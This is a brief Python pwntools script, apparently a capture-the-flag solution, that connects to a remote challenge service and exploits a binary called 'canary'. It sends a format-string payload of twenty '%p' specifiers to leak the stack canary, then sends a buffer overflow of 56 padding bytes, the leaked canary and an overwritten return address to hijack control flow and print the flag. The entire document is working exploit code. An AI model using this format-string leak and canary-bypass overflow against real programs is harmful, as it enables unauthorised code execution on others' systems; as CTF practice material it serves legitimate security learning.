
from pwn import *

# r = process('./canary')
r = remote('shell.actf.co', 20701)

p = '%p ' * 20

r.recvuntil('? ')
r.sendline(p)
s = r.recvuntil('? ')

b = s.split()[20]

log.info('Canary : ' + b.decode('utf-8'))

o = b'A' * 56 + p64(int(b.decode('utf-8'), 16)) + p64(0x0) + p64(0x0400787)


r.sendline(o)

s = r.recv()

log.info('Flag   : {}'.format(s.decode('utf-8')))

